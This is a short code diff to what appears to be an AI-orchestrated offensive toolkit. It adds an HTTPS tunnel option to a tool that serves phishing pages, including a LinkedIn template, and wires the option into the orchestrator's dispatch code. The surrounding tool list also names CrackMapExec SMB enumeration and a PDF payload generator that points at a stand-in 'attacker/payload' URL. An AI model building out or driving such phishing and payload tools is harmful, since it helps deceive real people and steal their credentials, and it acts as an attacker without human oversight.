@@ -80,7 +80,7 @@ AD / LATERAL:
 - crackmapexec: {"target": "10.0.0.1", "protocol": "smb"} — CrackMapExec enum
 
 PHISHING:
-- phishing_serve: {"template": "linkedin", "port": 8080} — Serve a phishing page
+- phishing_serve: {"template": "linkedin", "port": 8080, "use_tunnel": true} — Serve a phishing page with optional HTTPS tunnel
 - generate_payload_pdf: {"url": "http://attacker/payload"} — Create PDF payload
 
 FORENSICS:
@@ -451,6 +451,7 @@ class AIOrchestrator:
                     args.get("template", "generic"),
                     port=args.get("port", 8080),
                     on_output=callback,
+                    use_tunnel=args.get("use_tunnel", False)
                 )
             elif name == "generate_payload_pdf":
                 from shadowcypher.modules.phishing import Phishing
